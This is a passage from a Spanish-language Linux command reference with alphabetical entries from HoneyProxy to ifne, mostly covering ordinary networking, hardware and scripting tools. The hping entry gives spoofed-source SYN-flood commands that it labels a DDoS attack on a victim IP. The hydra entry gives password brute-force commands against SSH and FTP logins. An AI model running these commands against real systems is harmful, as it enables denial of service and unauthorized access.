$ git clone --recursive git://github.com/mhils/HoneyProxy.git
$ cd HoneyProxy
# python honeyproxy.py --no-gui -a 192.168.1.15 (Arrancar el servicio)
	HoneyProxy has been started!
	Configuration Details (normal users: ignore):
	GUI: http://honey:zhw78b35ioynhg8vr4jcfmn5f326d4e4@localhost:8081/app/
	Proxy Address: 192.168.1.15:8080
	WebSocket Port: 8082
	Auth user: honey
	Auth key: zhw78b35ioynhg8vr4jcfmn5f326d4e4
Una vez instalado y arrancado el servicio, configurar el navegador para su uso en Editar/Preferencias/Avanzado/Red/Configurar la conexión, clicar en "Configuración manual del proxy" y en servidor intermediario de HTTP porner la ip de la máquina local o remota puesta al arrancar la aplicación [192.168.1.15 en este caso] y el puerto 8080. Los informes, colocando en la barra de navegación la dirección que muestra al arrancar el servicio, en este caso: http://honey:zhw78b35ioynhg8vr4jcfmn5f326d4e4@localhost:8081/app/ (usuario: honey y key: zhw78b35ioynhg8vr4jcfmn5f326d4e4). Por defecto los informes se guardan en ./dump/sites. Para parar el servicio, matar el proceso:
	$ ps aux | grep honeyproxy
	$ kill -9 PID


host
Determina la ip de un registro DNS o, a partir de una ip, el nombre de registro
$ host google.com
$ host google.com 8.8.8.8
$ host -v -a telefonica.com
$ host -t SOA google.com
$ host -R 3 google.es (Eleva a 3 el número de intentos para obtener respuesta. Por defecto 1)
$ host -C google.es (Muestra los registros SOA y los servidores de nombres autorizados.)
Tipos de registros
	A (Registro de dirección que resuelve un nombre de un anfitrión hacia una dirección IPv4)
	AAA (Registro de dirección que resuelve un nombre de un anfitrión hacia una dirección IPv6)
	MX (Registro de servidor de correo que sirve para definir una lista de servidores de correo para un dominio, así como la prioridad, el que tiene el número más bajo de los servidores de correo es el que tiene mayor prioridad.)
	PTR (Registro de apuntador que resuelve direcciones IPv4 hacia el nombre anfitriones. Es decir, hace lo contrario al registro A. Se utiliza en zonas de Resolución Inversa)
	NS (Registro de servidor de nombres que sirve para definir una lista de servidores de nombres con autoridad para un dominio)
	SOA (Registro de inicio de autoridad que especifica el Servidor DNS Maestro (o Primario) que proporcionará la información con autoridad acerca de un dominio de Internet, dirección de correo electrónico del administrador, número de serie del dominio y parámetros de tiempo para la zona)
	SRV (Registro de servicios que especifica información acerca de servicios disponibles a través del dominio)
	CNAME (Registro de nombre canónico que hace que un nombre sea alias de otro)


host.conf
(/etc/host.conf). Archivo que contiene el orden de cómo serán ejecutadas las resoluciones que requiera el "Host". Algunos parámetros:
**order hosts,bind,nis** (que cualquier tipo de resolución primero consulte el archivo /etc/hosts , en segundo lugar a BIND y si aún no se ha logrado la resolución, intentar con NIS)
	BIND (Llamada al servidor de nombres)
	NIS ("Network Information Server" es un sistema de resolución desarrollado por Sun Microsystem's , su implementación generalmente esta limitada a intranets y utiliza una metodología diferente a la usada por BIND
**multi on** (Que devuelva más de un resultado si existen alias ya que un host puede tener varias direcciones IP y la dirección IP puede coincidir con varios nombres de host. Por defecto es off [sólo se muestra el primero] )
**spoofalert on** (Intentar encontrar el nombre de host de una dirección IP. Si la aplicación no devuelve el resultado correcto, puede significar que una máquina intenta hacerse pasar por lo que no es.)
**nospoof on** (rechaza los resultados que no pasan la prueba de robo de identidad)
**reorder on** (intenta reordenar las direcciones de host para que las direcciones locales [misma subred] se listen en primer lugar)


hostid
Muestra la identificación en hexadecimal del presente host.
$ hostid


hostname
Mostrar/modificar el hostname.
$ hostname -a (el alias de la maquina)
$ hostname -i (la IP del ordenador)
$ hostname -s (el nombre de la maquina)
1.-
Pasos para modificar el hostname:
# nano /etc/hosts
Y modificar la segunda linea:
127.0.0.1       localhost
127.0.1.1       nuevo_nombre
# nano /etc/hostname
Suprimir el nombre existente por nuevo_nombre
Lanzar el comando:
# hostname nuevo_nombre
Reiniciar.


hostnamectl
Comando similar a hostname pero más moderno. Muestra el nombre de host, el sistema operativo, el kernel y la arquitectura usada entre otros datos.
$ hostnamectl (muestra los datos del sistema)
$ hostnamectl status (lo mismo que la anterior)
# hostnamectl set-hostname nombre_maquina (define el hostname)


hosts
(/etc/hosts). Contiene la resolución de "Hosts" definidos localmente. La estructura es: IP, nombre del host.
	127.0.0.1       localhost
	127.0.1.1       tux
	192.168.1.10    crontux.zzzz.org
1.-
Configurar bloqueo de páginas web:
	# nano /etc/hosts
Y debajo de:
	127.0.0.1 localhost
	127.0.1.1 tux
Añadimos, después de la ip local, las que se quieran bloquear separadas por un espacio:
	127.0.0.1 www.porn.net www.google.es www.microsoft.com


hostsed
Herramienta para editar el archivo de hosts (por defecto /etc/hosts), puede agregar o eliminar una entrada DNS a través del shell de línea de comando. Hotsed proporciona una experiencia de línea de comandos idemponente con sus comandos 'agregar' y 'eliminar' que evitan entradas duplicadas o faltantes en el archivo de hosts.
$ hostsed add hostname (añadir un host en /etc/hosts)
$ hostsed del hostname (suprimir un host de /etc/hosts. Con el mismo resultado puede usarse ademas de "del", "rm", delete y "remove")
$ hostsed drop hostname (Eliminar líneas con IP o nombre de host especificado del archivo /etc/hosts)


howdoi
Consultar en StackOverflow alguna pregunta relacionada con programación, codificación, obtener ayuda en sintaxis, buscar bibliotecas para un propósito específico, resolver errores, usar funciones predefinidas y sus aplicaciones, etc.
$ howdoi commit on git
$ howdoi comment bash
$ howdoi redirect webpage


hp-check
[hplip]. Comprueba versiones, dependencia y permisos de HPLIP de la impresora HP. Crea un log en el directorio en el que se lanza con el nombre hp-check.log
$ hp-check -g (en modo debug. -t en texto plano.)


hp-doctor
[hplip]. Herramienta que comprueba versiones en desuso, complementos, dependencias, colas, permisos y proporciona procedimientos de autodiagnóstico de la impresora HP.
$ hp-doctor -g (modo debug)


hp-info
[hplip]. Muestra parametros de información de la impresora HP.
$ hp-info -g (en modo debug)


hp-levels
[hplip]. Muestra información gráfica sobre la carga de tinta de la impresora HP.
$ hp-levels -c -a '$' (en color y que use el simbolo "$" para el gráfico)


hplip
Soporte de HP para la mayoría de las impresoras de inyección de tinta HP y muchas LaserJets, tanto para escanear, enviar faxes y para el acceso a tarjetas fotográficas en la mayoría de las impresoras multifuncionales de la marca. Algunos de los comandos disponibles, a parte de algunos que estan directamente relacionados son: hp-align, hp-clean, hp-colorcal, hp-config_usb_printer, hp-firmware, hp-logcapture, hp-makeuri, hp-pkservice, hp-plugin, hp-probe, hp-query, hp-setup, hp-testpage y hp-timedate.


hp-scan
[hplip]. Herramienta de escaneo para una impresora HP.
$ hp-scan -g -m color (scanea una HP en collor [gray para blanco y negro] y guarda el resultado por defecto con el nombre hpscan001.jpg)
$ hp-scan -f scan.jpg --pdf=evince (guardarlo como scan.jpg y visualizarlo al final con evince)


hping
Herramienta de intrusión remota (ataque ICMP)
# hping3 -I eth0 -S 192.169.2.2  (ping no silencioso)
# hping3 -I eth0 -a 192.168.2.158 -S 192.169.2.2  (enmascarando  nuestra IP con una de ficticia-192.168.1.158)
# hping3 -I eth0 -a 192.168.2.158 -S 192.168.2.2 -p 135 (Descubrir máquinas que con un ping no responden, enmascarando la IP y especificando un puerto)
# hping3 -S -a ip_ficticia -p 80 -k ip_atacada
# hping3 -i m100 -S -a ip_ficticia -p 80 -k ip_atacada
# hping3 -S 192.168.1.158 --flood --rand-source -d 5000 -p 80 (Enviando paquetes lo más rápido posible [flood], simulando orígenes aleatorios [rand-source], tamaño del paquete en bites [d] y puerto de entrada)
# hping3 --rand-source -p 80 -S --flood ip_victima (ataque DDos a una ip)


hsetroot
Coloca imágen en el fondo de pantalla permitiendo modificar: brillo, contraste, transparencias...
$ hsetroot -clear "#f6f6f6" (Borra el rango de color especificado)
$ hsetroot -center imagen.jpg (coloca la imagen centrada. Otras opciones: -tile: mosaico, -full: respetando proporciones y -fill: redimensiona al tamaño de la pantalla)
$ hsetroot -blur 1.5 imagen.jpg (desenfoca)
$ hsetroot -contrast 30 imagen.jpg (Ajusta el contraste al valor)
$ hsetroot -flipv imagen.jpg (Refleja la imagen vertical. -fliph: horizontal y -flipd: diagonal)
$ hsetroot -alpha 150 imagen.jpg


hstr
Herramienta que mejora la búsqueda hacia atras [history], haciendo esta búsqueda mucho mas fácil que con el C-r convencional. Debemos entrar en source.list el repositorio:
	deb https://www.mindforger.com/debian stretch main
E incorporamos la key GPG:
# wget -qO - https://www.mindforger.com/gpgpubkey.txt | sudo apt-key add -
Recargamos e instalamos:
# apt update
# apt install hstr
Uso:
$ hstr rkhunter git (mostrará los comandos del historial con los argumentos especificados)
$ hstr -s (ver la configuración por si se desea incorporar a ~/.bashrc. En caso afirmativo lanzar: $ hstr --show-configuration >> ~/.bashrc)


htcacheclean
Se usa para mantener el tamaño del almacenamiento de mod_disk_cache dentro de un cierto límite. Esta herramienta puede ejecutarse manualmente o en modo demonio. Cuando se ejecuta en modo daemon, actua en segundo plano y comprueba los directorios de la caché a intervalos regulares para ver si el contenido de la caché se ha eliminado.
# htcacheclean -v -t -p/var/cache/apache2/mod_cache_disk -l1024M (de forma detallada [v], eliminando directorios vacios [t] del pDIR y con limite lLIMIT)
Alguna opción:
	-r (Limpiar a fondo. Esto supone que el servidor web Apache no se está ejecutando)
        -n (provoca un procesamiento más lento en favor de otros procesos)


htdbm
Se usa para manipular los archivos de formato DBM que se usan para almacenar nombres de usuario y contraseñas para la autenticación básica de usuarios HTTP a través de mod_authn_dbm de apache.
# htdbm -c /etc/apache2/.htdbm pepe (pedira contraseña y con firmación y creará el archivo .htdbm encriptado)
# htdbm /etc/apache2/.htdbm pepe (pide la nueva contraseña y confirmación de "pepe")
# htdbm -x /etc/apache2/.htdbm pepe (suprime al usuario "pepe"))


html
Lenguaje de marcado predominante en la elaboración de páginas web.
Las etiquetas básicas de HTML de obligada presencia en todo documento son:
	<!DOCTYPE> (define el tipo de documento HTML)
	<html> (Inicio del documento)
	<head>  (Cabecera del documento.  Metadatos que no se muestran en el navegador pero de especial relevancia para indexadores)
	En el interior de la etiqueta <head> podemos encontrar:
	<title>  (Título que aparece en la barra del navegador)
	<meta>  (Metainformación del codumentos: autor, fecha realización, codificación ...)
	<LINK>  (Otros metadatos: referencias a documentos anteriores, glosarios...)
	<body> (Cuerpo del documento que se muestra en el navegador)
	Dentro de la etiqueta <body> podemos encontrar:
	<a>  (Ancla. Crea un enlace a otro documento o parte del mismo)
	<h1>, <h2>,… <h6>  (Establece la medida de los títulos de cabecera. De h1, más grande a h6 más pequeño)
	<div> (División estructural de la página)
	<p>  (Párrafo)
	<br>  (Salto de linea)
	<table> (Inicio de una tabla. La fias se defines con <tr> i las celdas dentro de las filas con <td>)
	<ul> Lista desordenada.Los ítems se definen con <li>)
	<ol> (Lista ordenada. Los ítems se definen con <li>)
	<dl> (Lista de definición. Pueden ser <dt> [termino a definir] y <dd> Definición del termino)
Excepto algunas pocas etiquetas, la mayoría requieren ser cerradas con la misma etiqueta precedida de una barra: <html>....</html>
Nota.- Los permisos de las carpetas que se muestran en localhost [/var/www/html] han de ser 755 y los ficheros 644.


html2text
Lee documentos HTML en los archivos de entrada y los convierte en texto sin formato.
$ html2text -o salida.txt archivo.html (especificando nombre del archivo de salida)
$ cat entrada.html | html2text -o salida.txt (en forma de tuberia)
$ echo q | htop -C | aha --line-fix | html2text -width 999 | grep -v "F1Help" | grep -v "xml version=" > file.txt (Especificando un ancho distinto de 79 caracteres)


html-xml-utils
Proporciona una serie de utilidades simples para manipular y convertir archivos HTML y XML de varias maneras. La suite consta de las siguientes herramientas: asc2xml (Convertir de UTF -8 a xml), xml2asc (Convertir de xml a UTF-8), hxaddid (agregar IDS a elementos seleccionados), hxcite (reemplazar las referencias bibliográficas por hipervínculos),  hxcite-mkbib (expandir las referencias y crear bibliografía), hxclean (aplicar heuristics para corregir un archivo HTML), hxcopy (copiar un archivo HTML mientras preserva los enlaces relativos), hxcount (contar elementos y atributos en archivos HTML o XML), hxextract (Extraer elementos seleccionados), hxincl (Expandir archivos HTML o XML), hxindex (crear un índice ordenado alfabéticamente), hxmkbib (Crear bibliografía a partir de una plantilla), hxmultitoc (crear una tabla de contenido para un conjunto de archivos HTML), hxname2id (mueva "id =" o "name =" de un elemento a sus padres), hxnormalize (imprimir un archivo HTML), hxnsxml (Convertir la salida de HXXMLN de nuevo a XML normal), hxnum (Encabezados de sección de números en un archivo HTML), hxpipe (Convertir XML a un formato más fácil de analizar con Perl o Awk), hxprintlinks (numnero de links y agregar tabla de URL al final de un archivo HTML), hxprune (eliminar los elementos marcados de un archivo HTML), hxref (Generar referencias cruzadas), hxselect (extraer elementos que coincidan con un selector CSS), hxtoc (insertar una tabla de contenido en un archivo HTML), hxuncdata (reemplazar las secciones de Cdata por otros caracteres), hxunent (Reemplazar carácteres predefinidas HTML a UTF-8), hxunpipe (convertir la salida de la tubería de regreso al formato XML), hxunxmlns (Reemplazar los "nombres globales" por los prefijos del espacio de nombres XML), hxwls (Enlaces de lista en un archivo HTML) y hxxmlns (Reemplazar los prefijos del espacio de nombres XML por "nombres globales")


htop
Muestra el consumo de CPU, RAM y SWAP y debajo de estos los diferentes procesos  organizados por defecto de mayor a menor consumo de CPU. Pulsando “u” podremos introducir el usuario a monitorizar y pulsando “k” e introduciendo el PID, mataremos el proceso.
$ htop


htpasswd
Comando con el que definimos usuario y contraseñas para el servidor apache.
$ htpasswd -c /home/USER/public_html/.htpasswd USUARIO (Creando el archivo  .htpasswd en la ruta especificada con los datos de usuario)


httest
Suite para realizar pruebas HTTP personalizadas. herramienta basada en scripts para probar y evaluar comparativamente aplicaciones web, servidores web, servidores proxy y navegadores web. httest puede emular clientes y servidores incluso en el mismo script de prueba. La emulación de servidores es una característica única, muy útil para probar servidores proxy, navegadores web y navegadores y clientes HTTP. Incluye las herramientas htntlm, htproxy y htremote.
$ httest -T "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" (envía una solicitud GET a example.com y muestra la respuesta del servidor)
$ httest -T "GET /secure HTTP/1.1\r\nAuthorization: Basic <base64-encoded-credentials>\r\n\r\n" (solicitud GET autentificada [con credenciales en formato Base64] para acceder a una ruta protegida en el servidor)
Definir una serie de pruebas en un script con la ejecución más estructurada:
$ cat prueba.hts
    cat <<EOF > prueba.hts
    GET / HTTP/1.1
    Host: example.com
    \n
    EOF
    httest prueba.hts
$ htntlm -u USER -p PASSW -d http://example.com/secure (intenta autentificarse usando NTLM con las credenciales proporcionadas para acceder a una URL protegida)
$ htproxy -P http://proxy.example.com:8080 -T "GET http://example.com HTTP/1.1\r\nHost: example.com\r\n\r\n" (envía la solicitud HTTP a través de proxy.example.com en el puerto 8080)
$ htproxy -P http://proxy.example.com:8080 -T "GET http://example.com HTTP/1.1\r\nHost: example.com\r\nProxy-Authorization: Basic <encoded_credentials>\r\n\r\n" (solicitud a través de proxy con autenticación básica)
$ htremote -H remote.example.com -u usuario -p contraseña -s prueba.hts (envía el archivo prueba.hts para que se ejecute en remote.example.com usando autenticación y muestra los resultados)


httpd
Servicio de protocolo de transferencia de apache
$ httpd -l  (visualizar los módulos activos de apache)
$ httpd -L  (Listado de directivas disponibles)
$ httpd -t  (realiza un test de los archivos de configuración [Syntax OK])
$ httpd -h  (muestra las opciones)
$ httpd -v (versión de apache)
$ httpd -V (versión y parámetros compilados)


httping
Ping específico para conexiones HTTP. Envía solicitudes a un nombre de host o una URL remota y muestra cuánto tiempo lleva conectarse, enviar una solicitud HTTP y recuperar la respuesta.
$ httping -g http://www.tuxapuntes.com (forma básica)
$ httping -l -g https://localhost/ (usando una conexiḉon SSL)
$ httping -h localhost -p 80 (ping a localhost usando el puerto 80)
$ httping -g http://localhost/ -U username -P password (usando autentificación)


httrack
[WebHTTrack]. Crea en local una copia navegable de una web que puede visualizarse con un navegador sin necesidad de conexión a internet.
$ httrack sitio_escogido.com (Crea en el directorio personal una carpeta "sitio_escogido.com" con todos loa datos descargados del sitio original)
$ httrack sitio_escogido.com -O /root/descargas/pelis (Especificando lugar de descarga)


hunspell
Corrector ortográfico y morfológico. Permite modificar, incluir y ver opciones de palabras.
	$ echo 'El pinguino es hun systema mui bonitoo' | hunspell -A -d es_ES (Tradudir una frase. Los asteriscos son palabras correctas)
	@(#) International Ispell Version 3.2.06 (but really Hunspell 1.4.0)
	*
	& pinguino 1 3: pingüino
	*
	& hun 8 15: hin, un, huna, huno, han, aun, huí, huy
	& systema 2 19: sistema, estema
	& mui 12 27: muí, muo, mi, muir, muió, mua, mue, mus, tui, fui, mué, muy
	& bonitoo 4 31: bonito, bonitos, bonito o, boniato
$ hunspell -d es_ES -l archivo.txt (Corregir un texto)
$ hunspell -d es_ES -l archivo.odt (un odt)
$ hunspell -d es_ES -p unrecognized archivo.odt (palabra por palabra)
$ hunspell -i utf-8 archivo.txt (epecificando una codificación)
$ hunspell (entrar  de forma interactiva. Salir con C-c)
$ hunspell -D (mostrar diccionarios disponibles)
$ hunspell -l archivo.odt (imprime palabras mal escritas del fichero especificado)


hwb
Hardware Book contiene información técnica diversa sobre computadoras y otros dispositivos electrónicos. Tambien hay muchos conectores comunes y poco comunes disponibles, así como
información sobre cómo construir cables. Colocar en el navegador file:///usr/share/doc/hwb/html/about/index.html


hwclock
Ver fecha y hora de la BIOS
# hwclock -D (Muestra toda la información))
# hwclock -w (sincroniza la del hardware a la del sistema)
# hwclock -r  (verifica desfase entre ambas)
# hwclock --set (establece el RTC [Real Time Clock ] según --date)
# hwclock -a (ajusta la RTC para tener en cuenta la desviación sistemática)
# hwclock -u (la escala de tiempo del RTC es UTC [Universal Time Coordinated])


hwinfo
Información sobre la máquina más completa que con lshw.
$ hwinfo --disk (Información sobre los discos)
$ hwinfo --short --block (descripción general)
$ hwinfo --disk --only /dev/sdb (información de un disco solamente)
$ hwinfo --short (mostrar un resumen)


hwloc-gather-topology
Guarda los archivos de topología relevantes y la salida hwloc para uso posterior:
$ hwloc-gather-topology --dmi hwloc
	Topology files gathered in ./hwloc-topology.tar.bz2 and kept in /tmp/tmp.Mfv99mIHmB/hwloc/
	Expected topology output stored in ./hwloc.output
	WARNING: Do not post these files on a public list or website unless you
	WARNING: are sure that no information about this platform is sensitive.
El resultado nos advierte: "No publique estos archivos en una lista pública o sitio web a menos que estamos seguros de que ninguna información sobre esta plataforma es confidencial." y del directorio en el que los encontraremos: /tmp/tmp.Mfv99mIHmB/hwloc/


hwloc-info
Muestra información sobre la topologia de la máquina, proporcionando una vista jerárquica de la máquina, nodos de memoria NUMA, enchufes, cachés compartidos, núcleos, etc.
$ hwloc-info
$ hwloc-info package:all
$ hwloc-info -p core:2


hwloc-ls
Mostrar la topología del sistema. Comando parecido a lstopo-no-graphics y lstopo y con las mismas opciones.
$ hwloc-ls -.ascii (muestra la topolocia en forma ascii)
$ hwloc-ls -p (de forma lógica)
$ hwloc-ls -c (de la cpu)
$ hwloc-ls --whole-system (sin limitaciones de administración)


hwloc-ps
Listar los procesos que se esta ejecutando o los hilos que los enlazan.
$ hwloc-ps -a (Todos)
$ hwloc-ps -e (informa de los últimos procesadores donde se ejecutó un proceso o subproceso.)
Nota.- El resultado puede estar desactualizado ya que el sistema operativo puede mover las tareas a otros procesadores en cualquier momento de acuerdo con el enlace.


hxtools
Colección de herramientas y scripts que se han acumulado a lo largo de los años y cada uno de los cuales parece ser demasiado pequeño para garantizar su propio proyecto. El listado es:
 - bsvplay          - convertir archivos de música BASICA a PCM
 - cctypeinfo       - muestra los tamaños de los tipos C en la implementación con la que se compiló
 - checkbrack       - comprobación de paréntesis y recuento de paréntesis
 - declone          - romper los enlaces duros
 - diff2php         - transformar el parche en un archivo PHP de autoservicio
 - fd0ssh           - tubo para soporte de password-over-stdin a ssh
 - fnt2bdf          - convertir fuentes VGA sin procesar a X11 BDF
 - gpsh             - grep en listas de seguimiento y reproducción de archivos de audio
 - logontime        - muestra el tiempo de conexión acumulado de wtmp
 - mailsplit        - divide una mbox en ficheros individuales
 - mod2opus         - envoltura para el módulo de seguimiento/transcodificación de MIDI a Opus
 - hxnetload        - muestra la utilización de la interfaz de red
 - ofl              - abre el archivo lister (reemplaza el fusor y lsof -m)
 - paddrspacesiz    - tamaño de impresión de los espacios de dirección de los procesos
 - pesubst          - sustitución de la corriente perl-regexp (reemplaza la sed por sub-sustituciones)
 - pmap_dirty       - muestra la cantidad de RAM que un proceso usa con fuerza
 - proc_iomem_count - mostrar los tamaños de las regiones MMIO
 - qplay            - convierte las cadenas de reproducción de QBASIC a PCM
 - qtar             - interfaz más rápida para tar con pedido de archivos
 - Recurssive_lower - todos los nombres de ficheros en minúsculas recursivas
 - sourcefuncsize   - análisis estadístico del código
 - spec-beautifier  - programa para limpiar los archivos RPM .spec
 - stxdb            - Base de datos de archivos A/V
 - su1              - lo que el sudo debería haber hecho
 - utmp_register    - hacer entradas en la base de datos utmp/wtmp
 - vcsaview         - mostrar un volcado de pantalla en formato VCSA
 - vfontas          - Ensamblador de archivos de fuentes VGA
 - wktimer          - temporizador de trabajo


hydra
Se utiliza para crackear los sistemas de login de diferentes servicios como HTTP, FTP, TELNET, IMAP, SMB, SSH, etc.
# hydra 192.168.1.5 -l admin -p 1234 (Una ip con el usuario "admin" con la clave "1234")
# hydra -M lista_ips ssh -s 22 (A un listado de ips a una por linea y sobre el puerto 22)
# hydra 192.168.1.8 ftp -s 21 -l juan -P wordlist.txt (Una ip el puerto 21 del usuario "juan" y probando las contraseñas de un archivo de texto a una por linea)


i2p
El Proyecto Internet Invisible es una capa de red privada, anónima, descentralizada totalmente encriptada y construida usando Java con principios similares a Tor, pero que fue diseñada desde cero como una red oscura autónoma. Protege la actividad y localización y sin problemas de que rastreen o recopilen datos. I2P oculta el servidor al usuario y el usuario al servidor. Todo el tráfico I2P es interno a la red I2P. El tráfico dentro de I2P no interactúa directamente con Internet. Es una capa superior a Internet. Utiliza túneles unidireccionales encriptados entre usted y sus pares. Nadie puede ver de dónde viene el tráfico, a dónde va o cuál es su contenido. Además, I2P ofrece resistencia al reconocimiento de patrones y al bloqueo por parte de los censores.


i7z
Herramienta que muestra datos en tiempo real sobre cada core en los procesadores Intel Core i3, i5 o i7.
# i7z


iat
Herramienta que convierte ficheros de imagen de CD, DVD, etc a formato iso ISO9660. Puede convertir a ISO desde los siguientes formatos: BIN, MDF, PDI, CDI, NRG y B5I.
$ iat imagen.bin imagen.iso


ibam
Monitor de carga de la bateria
$ ibam -a


ibmonitor
Muestra el tráfico total por interfaz, tanto el enviado como el recibido. Descarga: <http://ibmonitor.sourceforge.net/download.html>
$ ./ibmonitor
$ ./ibmonitor --bytes --max --avg --data (Los valores de salida en KBytes/seg, los máximos por interfaz y datos transferidos)


ibus
Utilidad en línea de comandos que puede reiniciar o salir de ibus-daemon, obtener o configurar el motor ibus actual o enumerar los motores ibus.
$ ibus engine (obtiene el motor ibus)
$ ibus list-engine (muestra los disponibles)
$ ibus restart (reiniciar el daemon)
$ ibus start (arrancar el daemon)
$ ibus exit (salir de ibus daemon)
$ ibus address (muesttra la dirección D-bus del daemon ibus)
$ ibus reset-config (restablece los valores de la configuración)


icdiff
Parecido a diff [ver], pero en lugar de tratar de ser un reemplazo de diff para todas las circunstancias, el objetivo de icdiff es ser una herramienta que pueda alcanzar para obtener una mejor idea de lo que cambió cuando no es inmediatamente obvio desde diff.
$ icdiff -N archivo archivo1 (mostrando el número de linea)


iceauth
Se utiliza para editar y mostrar la información de autorización utilizada en la conexión con Internet Communications Engine [ICE] que se trata de marco RPC orientado a objetos que ayuda a crear aplicaciones distribuidas con un esfuerzo mínimo. Este programa generalmente se usa para extraer registros de autorización de una máquina y fusionarlos en otra (como es el caso cuando se usan inicios de sesión remotos o se otorga acceso a otros usuarios). Los comandos se pueden ingresar de forma interactiva, en la línea de comandos de iceauth o en scripts.
$ iceauth -v (entrar en el prompt y mostrar mensajes detallados, "q" para salir del prompt)


ico
Muestra poligonos en movimiento en la terminal.
$ ico -faces -colors red -sleep 0.5 (poligono conpacto rojo moviendose cada medio segundo)
$ ico -colors red -sleep 0.5 -bg yellow (poligono solo con aristas rojo y fondo amarillo)


iconv
Modificar la codificación de un archivo. Para saber la codificación de un archivo $ file --mime-encoding archivo.txt
$ iconv -l   (Muestra todas las opciones posibles)
$ iconv -f ISO85591 -t UTF8 viejo.txt -o nuevo.txt (Pasar viejo.txt de codificación ISO-8559-1 a UTF-8 en el nuevo.txt)


icp
[renameutils]. Igual que imv[ver], pero copia los archivos en lugar de moverlos.
$ icp dir/archivo.txt


icuinfo
imprime información básica sobre la versión actual de ICU.
$ icuinfo -m (Imprime la hora UTC actual en milisegundos)
$ icuinfo -k (Llama a u_cleanup antes de salir e intentará descargar complementos)


id
Conocer el uid y el gid del usuario especificado
$ id root
$ id -u (Del usuario no root)
$ id -a (De todos los grupos a los que pertenece el usuario)
$ id -un (Muestra el usuario con el que estamos)


identify
[imagemagick]. Ver las propiedades de una imagen
$ identify imagen.gif
$ identify -verbose imagen.jpg   (Con mucha más información)
$ identify -format %c imagen.png (Visualizar los comentarios)


idesk
Herramienta para la creación de iconos en el escritorio. Los archivos con extensión .lnk se colocan en el directorio ~/.idesktop. Una muestra:
$ nano .idesktop/home.lnk
	table Icon
	  Caption: Home
	  Command[0]: thunar /home/usuario
	  Icon: /usr/share/idesk/folder_home.xpm
	  Width: 48
	  Height: 48
	  X: 29
	  Y: 39
	end
Nombre del icono [Caption], El comando que se lanzará [0] con doble click izquierdo del ratón. Con [1], doble click derecho, en este caso thunar abrirá la carpeta personal [Command], la ruta al icono que se empleará [Icon], las medidas ancho [Width] y alto [Height] y la colocación en pantalla, x: distancia en pixels del lateral, y: distancia en pixels de la parte superior.
Otros parámetros [fuentes, colores, medidas, fondos, transparencias...] pueden configurarse en el archivo ~/.ideskrc. Cualquier modificación en idesktop o ideskrc precisa matar el proceso:
$ killall idesk
Y relanzarlo:
$ idesk


iecset
Muestra el estado actual de IEC958 en una forma legible para humanos. Cuando se dan los comandos en los argumentos, se analizan y se actualizan los bits de estado IEC958. El estado resultante se muestra también.
$ iecset -x (Muestra los bits de estado actuales de IEC958 en estilo de los argumentos para el flujo PCM)
$ iecset pro off audio off (Establece el estado actual y activa el bit que no es de audio. También se mostrará el estado modificado)


if
Ejecuta uno o varios comandos dependiendo de si una condición se cumple o no. Algunos scripts de ejemplo para su uso [ver operadores]:
1.-
	#!/bin/bash
	read -p "Ingrese nombre del usuario: " USUARIO
	if grep -e ^$USUARIO: /etc/passwd
	then
	 	echo "El usuario existe en el sistema"
	else
		echo "Usuario desconocido"
	fi
	exit 0
2.-
	#!/bin/bash
	if [ "$(id -u)" != "0" ]; then
		echo "Solo root puede ejecutar este script."
		exit 1
	fi
3.-
	#!/bin/bash
	# Verificar si se ha entrado un argumento
	if [ -z "$1" ]
	then
		      echo "Falta el argumento después del nombre del script"
	exit
	fi
4.-
	#!/bin/bash
	# Introducir dos números diferentes e indicar
	# cuál es el mayor
	read -p "Introduce dos números: " A B
	if [ $A -gt $B ]
	then
		    echo $A "es el mayor"
	else
		    echo $B "es el mayor"
	fi
5.-
	#!/bin/bash
	#Con varias opciones [elif]
	ls
	echo
	read -p "Cual leer: " LEER
	echo
	if [ -f $LEER ]
	then
		echo
		cat $LEER
		echo
	elif [ -d $LEER ]
	then
		echo
		echo "Es un directorio...."
	else
		echo
		f_echo "¡¡NO EXISTE!!"
		echo
	fi
6.-
	#!/bin/bash
	echo "Diga si o no:"
	read RESPUESTA
	if  [ "$RESPUESTA" = si ]; then
		echo "Has escrito si"
	elif [ "$RESPUESTA" = no ]; then
		echo "Has escrito no"
	elif [ "$RESPUESTA" = "" ]; then
		echo "No has escrito nada"
	else
		echo "Has escrito una cosa no permitida"
	fi
7.-
	#!/bin/bash
	# and y or como condicional
	echo
	if [[ -f ~/.bashrc ]] && [[ -r ~/.bashrc ]]
	then
	    echo "Existe y se puede leer"
	fi
	#
	if [[ 4 -lt 3 ]] || [[ 7 -eq 7 ]]
	then
	    echo "Uno de los dos es verdadero"
	fi
8.-
	#!/bin/bash
	# Comprobar si un directorio está vacio
	DIR=~/polles
	#
	if [ "$(ls -A $DIR)" ]
		then
    	echo "Contiene archivos"
	else
        echo "Vacio (o no existe o es un archivo)"
	fi


ifconfig
[net-tools]. Define direcciones ip y dispositivos de red
# ifconfig  (ver los datos de conexión)
# ifconfig eth0 up 192.168.1.2 (Levanta la placa de red eth0 y le da la ip)
# ifconfig eth0 down (Cierra la red eth0)
# ifconfig eth0 promisc (Poner la placa en modo promiscuo)
# ifconfig wlan0 up (si se trata de redes inalámbricas)
# ifconfig eth0 hw ether 00:01:02:03:04:05  (cambiar la dirección MAC)


ifdata
[moreutils]. Muestra información de la red.
$ ifdata -p eth0 (Muestra la ip local, la mascara de red, la dirección broadcast y los MTU de la red)
$ ifdata -pa -pn eth0 (Muestra la ip local i la mascara de red)
$ ifdata -pe eth5 (Muestra "yes" o "no" sobre si existe o no la red especificada)
Otras opciones:
-pb (La dirección broadcast)
-ph (Muestra la MAC)
-pf (Muestra las caracteristicas de la red)


ifdown
[ifupdown]. Deshabilita la interfase especificada:
# ifdown eth0
# ifdown -a (Deshabilita todas las redes)


ifmetric
Permite Cambiar la prioridad de enrutamiento.
# ifmetric wlan0 1 (Dar a todas las demás interfaces una prioridad más alta que wlan0)
# ifmetric wlan0 0 (restablecer las prioridades)


ifnames
Escanear archivos fuente en C (o la entrada estándar, si no se proporciona ninguno) y mostrar por pantalla una lista ordenada de todos los identificadores que aparecen en esos archivos en las directivas "#if", "#elif", "#ifdef" o "#ifndef". Imprime cada identificador en una línea, seguido de una lista separada por espacios de los archivos en los que aparece ese identificador.
$ ifnames file.c


ifne
[moreutils]. Se ejecuta si la entrada estandar no está vacia.
$ find . -name archivo | ifne echo "Existe" (Si "archivo" existe se ejecutará el echo. Si no existe, no)
$ find . -name archivo | ifne -n echo "No existe" (Si "archivo" no existe se ejecutará el echo. Si existe, no)


ifplugd
